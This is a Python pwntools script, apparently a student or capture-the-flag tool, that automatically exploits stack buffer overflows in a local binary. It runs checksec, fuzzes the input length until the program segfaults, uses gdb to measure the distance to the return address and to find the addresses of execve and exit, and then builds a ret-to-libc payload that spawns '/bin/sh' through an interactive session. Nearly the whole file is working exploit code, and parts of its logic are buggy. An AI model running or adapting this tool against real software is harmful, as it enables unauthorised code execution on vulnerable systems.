from pwn import *
import subprocess 
import sys
import time
import numpy as np
import codecs



# downloaded GEF
executable_name = sys.argv[1]
line = "-------------------------------------"
CANARY = False
NX = False
PIE = False
ASLR = False
RANGE_INPUT = [] # min and max number of inputs taken
NUM_BYTE_ARR = [] # number of bytes taken for each input
LIBC = False 
EXECVE = 0
EXIT = 0
MAIN_OVERFLOW = False
DICTIONARY = {}
FUNCTIONS = []
BIT_SYSTEM = 32
#EXECUTABLE = process('./' + executable_name)
hex_values = ["a", "b", "c", "d", "e", "f", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]


def create_input_file(num_inputs):
  input_file = open("input_file.txt", "w")
  print("CREATING INPUT FILE \n")
  for i in range(num_inputs): # input starts at 0
    
    hex_value = 0x01 + i
    extended_hex = hex_value
    for j in range(7):
      extended_hex <<= 8
      extended_hex += hex_value
    string_of_hex = str(hex(extended_hex))[2:]
    if len(string_of_hex) == 15:
      string_of_hex = "0"+string_of_hex
    
    input_file.write(codecs.decode(string_of_hex, 'hex').decode("utf-8")) # writing 01010101 for first, then 02020202... up to fefefefe
    input_file.write("\n")
    
def is_four_pair(string): #abababab
  first_pair = string[0:2]
  for i in range(3):
    if first_pair != string[2+(i*2):4+(i*2)]:
      return False
  if first_pair != "00" and first_pair != "ff":
    return True
  return False
  
  
def determine_buffer_size(func_name):
  global DICTIONARY
  # begin process
  context.terminal = ['tmux', 'splitw', '-h']
  time.sleep(1)

  # need to perform this as many times as there are input functions in function argument
  break_at_return = "b *(" + func_name + "+" + str(DICTIONARY.get(func_name)[4]) + ")\n"
  for i in range(len(DICTIONARY.get(func_name)[1])):
    executable = process("./" + executable_name)
    break_before_input = "b *(" + func_name + "+" + str(DICTIONARY.get(func_name)[2][i]) + ")\n"
    break_after_input = "b *(" + func_name + "+" + str(DICTIONARY.get(func_name)[3][i]) + ")\n"
    # want randomization always disabled so we can focus on offsets 
    script = "set logging overwrite on \n set pagination off \n set logging enabled on \n  set disassembly-flavor intel \n "
    script += break_before_input
    script += break_after_input
    script += break_at_return
    #'script += "r < input_file.txt \n"
   
  
    print_stack = "x/80x $esp \n" 
    script +=  "c\n" + print_stack +  "c\n" + print_stack + "c \n x/4x $esp \n c\n" # show before input, after input, and right before returning from stack 
    #script += "balls\n" + print_stack + "  c \n " + print_stack + " c \n x/4x $esp \n" 
    
    gdb.attach(executable, gdbscript = script)
    time.sleep(2)
    

 
    input_file = open("input_file.txt", "r")
    count = 0
    while input_file:
      
      aline = input_file.readline()
      
      if len(aline) == 9:
        executable.sendline(aline.encode()[:-1])
        
      else:
        break
      count += 1
    #executable.close()
    
    time.sleep(2)
    executable.close()
 

    gdb_file = open("gdb.txt")
    gdb_output = gdb_file.read()
    # break up into the three chunks
    index1 = gdb_output.find("Breakpoint 1,")
    index2 = gdb_output.find("Breakpoint 2,")
    index3 = gdb_output.find("Breakpoint 3,")
    
    if index1 == -1 or index2 == -1 or index3 == -1: 
      return
    
    chunk1 = gdb_output[index1:index2]
    chunk2 = gdb_output[index2:index3]
    chunk3 = gdb_output[index3:]
    
    # now go to the next lines
    
    final_chunk1 = chunk1[chunk1.find("\n")+1:]
    final_chunk2 = chunk2[chunk2.find("\n")+1:]
    final_chunk3 = chunk3[chunk3.find("\n")+1:]
    
    # create 2 files
    
    stack_before = open("stack_before.txt", "w")
    stack_after = open("stack_after.txt", "w")
    
    stack_before.write(final_chunk1)
    stack_after.write(final_chunk2)
    
    stack_before.close()
    stack_after.close()
    
    # use diff to find the difference and pipe into file
    subprocess.call("diff stack_before.txt stack_after.txt >| diff.txt" , shell=True)
    
    difference = open("diff.txt")
    difference_text = difference.read()
    # search for 4 repeats of pairs of ascii
    index_of_four_pair = 0
    for j in range(len(difference_text)-7):
      if is_four_pair(difference_text[j:j+8]):
        index_of_four_pair = j
        break
        
   
    value_of_four_pair = int("0x" + difference_text[index_of_four_pair:index_of_four_pair+2], 16)
    count_space = 0
    index_end_address = 0
    # now that we found where, we must calculate the exact address 
    for j in range(index_of_four_pair, 0, -1):
      if difference_text[j] != "\t" and difference_text[j+1] == "\t":
        count_space += 1
      if difference_text[j] == ":":
        index_end_address = j-1
        break
    offset = (count_space-1)*4
    
    # we have where address starts and offset from it 
    # we are assuming that everything is aligned
    acc_address = ""
    for j in range(index_end_address, 0, -1):
      if difference_text[j] == ">":
        break
      acc_address = difference_text[j] + acc_address
    
    start_of_buffer = int(acc_address[1:],16)+offset
    
    # update dictionary
    value = DICTIONARY.get(func_name)
    original_last = value[6]
    value_number = value[7]
    original_last.append(start_of_buffer)
    value_number.append(value_of_four_pair)
    temp_value = (value[0], value[1], value[2], value[3], value[4], value[5], original_last, value_number)

    DICTIONARY.update({func_name:temp_value})

   
   
      
      
    
    
    # now that we know where it starts, we must calculate where return 
    # address is located which is in chunk3
    acc_ret_address = ""
    for j in range(len(final_chunk3)):
      if final_chunk3[j] == ":":
        break
      acc_ret_address += final_chunk3[j]
    
    ret_address = int(acc_ret_address, 16)
    official_difference = ret_address - start_of_buffer  
    dict_value = DICTIONARY.get(func_name)
    
    print("DETECTED FOR INPUT " + str(value_of_four_pair) + ": FUNCTION " + func_name + " CONTAINS INPUT METHOD " + dict_value[1][i] + " THAT HAS BUFFER OF LENGTH " + str(official_difference) + "-" + str(official_difference+(BIT_SYSTEM/8)) + " UNTIL BEGINNING OF RETURN ADDRESS\n" )
    updated_distance = dict_value[5]
    updated_distance.append(official_difference)
    DICTIONARY.update({func_name: (dict_value[0], dict_value[1], dict_value[2], dict_value[3], dict_value[4], updated_distance, dict_value[6], dict_value[7])})
    

    
      
        
      
        
              
      
    
    
    
    # now need to parse
    

def create_dictionary_funcs(functions):
  global DICTIONARY
  for i in range(len(functions)):
    DICTIONARY.update({functions[i]:info_from_func(functions[i])})
  
    
def is_hex_value(character):
  for i in range(len(hex_values)):
    if character == hex_values[i]:
      return True
  return False
  
def info_from_func(func_name):
  f = open(func_name+".txt")
  function_text = f.read()
  # want to return data structure that contains info about function
  # (does it contain one of the gets functions?, [functions that are inside], [offset of instruction from start], [offset of next instruction from start], offset of ret , [size of buffers required where last 4 that overwrite are not included], [start of buffer address], [input number])
  # 
  found_input_func = False
  functions_inside = []
  offset_from_start = []
  before_offset_from_start = []
  offset_of_ret = 0
  start_address = 0
  found_start = False
  while True: 
    scanf = function_text.find("<scanf")
    gets = function_text.find("<gets")
    fscanf = function_text.find("<fscanf")
    ret = function_text.find("ret")
    start = function_text.find("<"+func_name+">")
    found_ret = False
    
   
    
    indices = []
    
    if scanf != -1:
      indices.append(scanf)
      found_input_func = True
    if gets != -1:
      indices.append(gets)
      found_input_func = True
    if fscanf != -1:
      indices.append(fscanf)
      found_input_func = True
    if ret != -1:
      indices.append(ret)
    if start != -1 and found_start == False:
      
      indices.append(start)
    
    if len(indices) == 0:
      break
    
      
      
    minimum_val = min(indices)
    
    if minimum_val == scanf: 
      functions_inside.append("scanf")
    elif minimum_val == gets:
      functions_inside.append("gets")
    elif minimum_val == fscanf:
      functions_inside.append("fscanf")
    elif minimum_val == ret:
      found_ret = True
    elif minimum_val == start:
      found_start = True
      
      
    acc_address = ""
    
    index_pointer = minimum_val
    
    index_pointer_for_prev = minimum_val
    if found_ret :
      # if return function or start, we go backwards
       for i in range(minimum_val, 0, -1):
          if function_text[i] == ":":
            break
          index_pointer-=1
    elif minimum_val != start: 
      # if other function, we go forwards
      for i in range(minimum_val, len(function_text), 1):
        if function_text[i] == ":":
          break
        index_pointer+=1
      
      for i in range(minimum_val, 0, -1):
        if function_text[i] == ":":
            break
        index_pointer_for_prev-=1
    
    # this is where the function is called and the address of the instruction afterwards   
    index_pointer_for_prev -=1
    index_pointer -= 1
    
    acc_address_prev = ""
    
    if minimum_val == start:
      index_pointer -= 1
    for i in range(index_pointer, 0, -1):
      if is_hex_value(function_text[i]):
        acc_address = function_text[i]+acc_address
      else:
        break
    for i in range(index_pointer_for_prev, 0, -1):
      if is_hex_value(function_text[i]):
        acc_address_prev = function_text[i]+acc_address_prev
      else:
        break
    if minimum_val == start:
      
      start_address = int(acc_address, 16)
    elif found_ret:
      offset_of_ret = int(acc_address, 16) - start_address
    else: 
      offset_from_start.append(int(acc_address, 16) - start_address)
      before_offset_from_start.append(int(acc_address_prev, 16) - start_address)
      
     # acc address is address of instruction after call to input function or ret
     # instruction
 
      
    function_text = function_text[minimum_val+1:]
    
  return (found_input_func, functions_inside, before_offset_from_start, offset_from_start, offset_of_ret, [], [], [])
    
      
# find the next address of a register in the gdb output
def find_register_value(large_str):
  index_of_first_void = large_str.find("(void *)")
  if index_of_first_void == -1:
    return -1, -1
  else: 
    acc_address = ""
    for i in range(index_of_first_void + len("(void *) "), len(large_str), 1):
      if large_str[i] != "\n":
        acc_address += large_str[i]
      else:
        break
    return int(acc_address, 16), index_of_first_void
  
# returns int value of address if found and index where str starts at if found
def find_string_address(large_str, str):
  index_of_first_system = large_str.find(str)

  if index_of_first_system == -1 :
    return -1,-1
  else: 
    # extract address, -2 because there is space
    acc_address = ""
    for i in range(index_of_first_system-2,-1, -1):
      
      acc_address = large_str[i] + acc_address
      # found beginning so return
      if large_str[i] == "x":
        
        break
    acc_address = "0" + acc_address
    return int(acc_address, 16), index_of_first_system

# is input requested?
def test_if_input(): 
  executable = process('./' + executable_name)
  
  print(line)
  print("TESTING TO SEE IF PROGRAM TAKES INPUT")
  print(line)

  try:
    executable.sendline(b"a")
    print("PASS: PROGRAM ACCEPTS INPUT")
    executable.close()
    return 1
  

  except: 
      print("FAIL: PROGRAM DOES NOT ACCEPT INPUT")
      return 0
  #time.sleep(3)
  #print(line)
  
def number_of_inputs():
  global RANGE_INPUT
  print(line)
  print("TESTING TO SEE HOW MANY TIMES PROGRAM REQUESTS INPUT")
  print("WARNING: IF PROGRAM TAKES SPECIAL INPUT, REQUESTS MAY BE UNBOUNDED")
  print(line)
  num_trials = 10
  unbounded = False
  timeout = 5
  input_count = []
  
  for i in range(num_trials):
    count = 0
    initial_time = time.perf_counter()
    executable = process('./' + executable_name)
    while True: 
      # keep sending lines until time exceeded or exception
      try:
        executable.sendline(b"a")
        time.sleep(0.01) # will depend on how long the program takes
        count += 1
        if initial_time - time.perf_counter() > 5.0:
          
          unbounded = True
          input_count.append(count)
          executable.close()
          break
      except:
        input_count.append(count)
       
        executable.close()
        break
  max_value = max(input_count)
  min_value = min(input_count)
  if unbounded:
    print("NUMBER OF INPUTS: " + str(min_value) + " to unbounded" )
  else: 
    if max_value == min_value:
      print("NUMBER OF INPUTS: " + str(min_value) )
    else: 
      print("NUMBER OF INPUTS: " + str(min_value) + " to " + str(max_value) )
  RANGE_INPUT = [min_value, max_value]
      
      
      
      
    
def check_security_protocol():
  global CANARY
  global NX
  global PIE
  print(line)
  print("CONDUCTING SECURITY CHECK\n")
  result = subprocess.run(['./checksec', f'--file={executable_name}'], stdout=subprocess.PIPE)
  print(result.stdout.decode())
  string_array = result.stdout.split(b"\n")[1:]
  new_string_array = b""
  for index in range(len(string_array)):
    new_string_array += string_array[index] + b" "
  new_new_string_array = new_string_array.split()
  index = 0

  for value in new_new_string_array: 
    if b"Canary" in value:

      if b"No" not in new_new_string_array[index - 1]:
        CANARY = True 

    else: 
      if b"NX" in value:
        if b"enabled" in new_new_string_array[index + 1]:
          NX = True

      else:
        if b"PIE" in value:
          if b"enabled" in new_new_string_array[index+1]:
            PIE = True

    index += 1
    
def get_to_input(executable, input_num):
  for i in range(input_num):
    try:
      executable.sendline(b"a")
      return 1
    except: 
      return 0
  return 1

# note, this doesn't work for unbounded inputs!!!!
def finish_sending(executable):
  
  for i in range(RANGE_INPUT[1]):
    try:
      executable.sendline(b"a")
    except:
      executable.close()
      break
  executable.wait_for_close()
  '''time.sleep(1)
  executable.close()'''
  return executable.poll()
  
  
def inputs_to_overflow():
  global RANGE_INPUT
  print(line)
  print("CHECKING HOW MANY BYTES UNTIL AN OVERFLOW\n")
  
  for i in range(RANGE_INPUT[1]):
    num_bytes = 0
    payload = b""
    print("CHECKING INPUT " + str(i+1) + "...")
    initial_time = time.perf_counter()
    
    while True:
      executable = process('./' + executable_name)
      # depending on which input we are one, we need to get there in the first place
      success = get_to_input(executable, i)
      
      if success and time.perf_counter() - initial_time < 5.0:
        num_bytes += 1
        payload += b"a"
        
        try:
          executable.sendline(payload)
          # -11 if segfault
          exit_code = finish_sending(executable)
          
          if exit_code == -11:
            NUM_BYTE_ARR.append(num_bytes)
            print(str(num_bytes) + " bytes caused SEGFAULT for input " + str(i+1))
            break
          
        except:
          NUM_BYTE_ARR.append(-1)
          print("No segfault for input " + str(i+1))
          break
      else:
        executable.close()
        NUM_BYTE_ARR.append(-1)
        print("No segfault for input " + str(i+1))
        break
      
def stack_aslr_test():
  global ASLR
  context.terminal = ['tmux', 'splitw', '-h']
  time.sleep(1)
  executable = process("./" + executable_name)

  # split terminal, then run "tmux in that split terminal"

  # everything logged to gdb.txt
  script = "set logging overwrite on \nset logging enabled on \n   set disassembly-flavor intel \n set disable-randomization off \n b *(main)\n r \n p $esp \n r \n p $esp \n exit \n"

  gdb.attach(executable, gdbscript=script)


  time.sleep(2)
  executable.close()

  f = open("gdb.txt", "r")
  gdb_output = f.read()


  # find first outcome of system
  first_esp_address, index_of_first_void = find_register_value(gdb_output)

  if first_esp_address == -1: 
    print("SOME ERROR")
  gdb_output = gdb_output[index_of_first_void+3:]
  second_esp_address, index_of_second_void = find_register_value(gdb_output)
  if first_esp_address - second_esp_address == 0:
    print("ASLR IS DEACTIVATED...")
    ASLR = False
    
  else: 
    print("ASLR IS ACTIVATED")
    ASLR = True
    
def check_aslr_and_libc():
    print(line)
    global LIBC
    global ASLR
    global EXECVE
    global EXIT
    print("CHECKING IF ASLR IS ON AND IF LIBC IS PRESENT \n")
    context.terminal = ['tmux', 'splitw', '-h']
    time.sleep(1)
    executable = process("./" + executable_name)

    # split terminal, then run "tmux in that split terminal"
    # everything logged to gdb.txt
    script = "set logging overwrite on \nset logging enabled on \n   set disassembly-flavor intel \n set disable-randomization off \n b *(main)\n r \n p execve \n r \n p execve \n p exit \n exit \n"

    gdb.attach(executable, gdbscript=script)


    time.sleep(2)
    executable.close()

    f = open("gdb.txt", "r")
    gdb_output = f.read()

    # find first outcome of system
    first_system_address, index_of_first_system = find_string_address(gdb_output, "<execve>")
    if first_system_address == -1: 
      print("NO LIBC FOUND. ANOTHER EXPLOIT METHOD MUST BE ATTEMPTED...")
      LIBC = False
      stack_aslr_test()
    gdb_output = gdb_output[index_of_first_system+1:]
    second_system_address, index_of_second_system = find_string_address(gdb_output, "<execve>")
    if first_system_address - second_system_address == 0:
      print("LIBC FOUND AND ASLR IS DEACTIVATED...")
      LIBC = True
      ASLR = False
      print("EXECVE FUNCTION FOUND AT ADDRESS " + str(hex(first_system_address)))
      EXECVE = first_system_address
      first_exit_address, _ = find_string_address(gdb_output, "<exit>")
      EXIT = first_exit_address
      
    else: 
      print("LIBC IS FOUND AND ASLR IS ACTIVATED...")
      LIBC = True
      ASLR = True
      
      

    
    
def determine_exploit_type():
  
  print(line)
  print("DETERMINE EXPLOIT TYPE...")
  if not(CANARY):
    if not(LIBC):
      if not(NX) and not(ASLR):
        print("WILL ATTEMPT EXECUTION ON STACK SINCE NO NX AND NO LIBC")
      elif not(NX) and ASLR:
        print("WILL ATTEMPT BRUTE FORCE EXECUTION (AND LEAK) ON STACK SINCE NO NX AND NO LIBC AND ASLR PRESENT")
      elif ASLR: 
        print("WILL ATTEMPT BRUTEFORCE (AND LEAK) ROP")
      else: 
        print("WILL ATTEMPT ROP")
    elif not(ASLR):
      print("WILL ATTEMPT RET-TO-LIBC SINCE NO ASLR and LIBC PRESENT") 
    else: 
      
        print("WILL ATTEMPT BRUTE FORCE RET-TO-LIBC SINCE ASLR DETECTED")          
  else: 
    print("WILL ATTEMPT TO BYPASS CANARY FIRST BY LEAK THEN BRUTE-FORCE")
              

def check_main_overflow():
  global MAIN_OVERFLOW
  print(line)
  print("CHECKING TO SEE IF WE CAN CHANGE RETURN ADDRESS OF MAIN DIRECTLY")
  
  f = open("main.txt", "r")
  objdump_output = f.read()

# find leave and ret are present
  if objdump_output.find("leave") != -1 and objdump_output.find("ret") != -1:
    print("CAN OVERFLOW MAIN")
    MAIN_OVERFLOW = True
  else: 
    print("CANNOT OVERFLOW MAIN") 
    MAIN_OVERFLOW = False
  
  
 # tried seeing if we have input x that is in main if we cannot overflow main
 # alternatively, we can perform our brute force which analyzes stack and
 # if analysis doesn't perform properly, then we cannot overflow
 
 # first go through each call to gets/scanf/... and for each call do the following:
 # store the calling function, find the address of it in memory (+5 is next 
 # instruction which we want to break at), send text file with 4 hex values that
 # go from 01 to fe and search for these on stack that is x/100x $esp. At break
 # point, extract addresss that they start at, then continue until return (must
 # find address of this), then show stack. Top value should be return value, 
 # and extract the address that this is stored at. The difference of addresses
 # should be how much buffer I need 
def extract_text_functions():
  global FUNCTIONS
  print(line)
  print("BEGIN EXTRACTION OF LOCAL FUNCTIONS\n")
  
  f = open("text_funcs.txt")
  funcs = f.read()

  funcs_array_init = funcs.split()

  funcs_array = []
  print("FOUND THE FOLLOWING FUNCTIONS: ")
  for i in range(len(funcs_array_init)):
    if i % 3 == 2:
      funcs_array.append(funcs_array_init[i])
      print(funcs_array_init[i])
  
  
  FUNCTIONS = funcs_array


  # go through functions and store dumps in files
  for i in range(len(funcs_array)): 
    if funcs_array[i] != "main":
      subprocess.call("objdump -M intel --disassemble=" + funcs_array[i] + " " + executable_name + " >| " + funcs_array[i] + ".txt", shell=True)
# what we do for when we have executable stack 
'''def execute_shell_stack():
  
  for i in range(RANGE_INPUT[1]):'''
    
  
def calc_dist_to_ret():
  print(line)
  print("CALCULATING BYTES TO RETURN ADDRESS\n")
  create_input_file(RANGE_INPUT[1])
  
  create_dictionary_funcs(FUNCTIONS) # (does it contain one of the gets functions?, [functions that are inside], 
  #[offset of instruction from start], [offset of next instruction from start], offset of ret , [size of buffers required where last 4 that overwrite are not included], [start of buffer address], [input number])
  
  for key,value in DICTIONARY.items():
    if value[0]:
     
      determine_buffer_size(key)
      
      
def ret_to_libc_no_aslr():
  print(line)
  print("CONSTRUCTING EXPLOIT THAT USES RET-TO-LIBC WITH NO BRUTEFORCE...")
  
  for key,value in DICTIONARY.items():
    if not(not(value[0]) or (key == "main" and not(MAIN_OVERFLOW))):
      

      for i in range(len(value[7])):
        
        print("CONSTRUCTING EXPLOIT FOR INPUT " + str(value[7][i]) + " LOCATED IN FUNCTION " + key)
        
        for j in range(5): #update for portability 
          
              executable = process("./" + executable_name) 
              script = "set disassembly-flavor intel \n set disable-randomization off\n  b *(local_func+48) \n b *(local_func+56)"
              time.sleep(1)
              #gdb.attach(executable, gdbscript = script)

              # push ecx screwing it up, align int with address space? 
              bash = b'/bin/sh\x00'
              address_of_bash = p32(value[6][i]-j)
              address_of_exit = p32(EXIT)
              execve_address = p32(EXECVE)
     
              exploit = bash + b'a'*((value[5][i]+j)-len(bash)) + execve_address + address_of_exit + address_of_bash + b'\x00'*50
              print("")
              print("ATTEMPTING OFFSET OF " + str(j) + " FROM FOUND BUFFER DUE TO ALIGNMENT")
              for k in range(value[7][i]-1):
                executable.sendline(b'a')

              executable.sendline(exploit)
              
              executable.interactive()
      
    
  

      


# download checksec


# how many times is input requested?

# what functions are used? objdump?

# where are the functions located? 

# to overflow main, we need to leak address of stack 
# otherwise, we need to overflow other function

#PIE just changes where executable memory is, ASLR will change libc and stack


if __name__ == "__main__":
    context.log_level = 'error'
    
    print(line)
    print("BEGIN INITIAL PROBING")
    
    passed = test_if_input()
    if passed == 0:
      sys.exit(0)
      
    number_of_inputs()
    
    check_security_protocol()
    
    # can update so that it checks multiple times and can check execution path
    inputs_to_overflow()
    
    check_aslr_and_libc()
    

    
    determine_exploit_type()
    
    # check to see if we can conduct buffer overflow for main or if they use indirect addressing 
    
    check_main_overflow()
    
    
    print(line)
    print(line)
    print(line)
    print("BEGINNING CONSTRUCTION OF EXPLOIT")
    print(line)
    print(line)
    
    extract_text_functions()
    
    calc_dist_to_ret()
    
    print(line)
    
    if not(CANARY):
      if not(LIBC):
        if not(NX) and not(ASLR):
          print("WILL ATTEMPT EXECUTION ON STACK SINCE NO NX AND NO LIBC")
        elif not(NX) and ASLR:
          print("WILL ATTEMPT BRUTE FORCE EXECUTION (AND LEAK) ON STACK SINCE NO NX AND NO LIBC AND ASLR PRESENT")
        elif ASLR: 
          print("WILL ATTEMPT BRUTEFORCE (AND LEAK) ROP")
        else: 
          print("WILL ATTEMPT ROP")
      elif not(ASLR):
        print("WILL ATTEMPT RET-TO-LIBC SINCE NO ASLR and LIBC PRESENT") 
        ret_to_libc_no_aslr()
        
      else: 
        
          print("WILL ATTEMPT BRUTE FORCE RET-TO-LIBC SINCE ASLR DETECTED")          
    else: 
      print("WILL ATTEMPT TO BYPASS CANARY FIRST BY A LEAK, FOLLOWED BY A BRUTE-FORCE")
    
    
    
 
    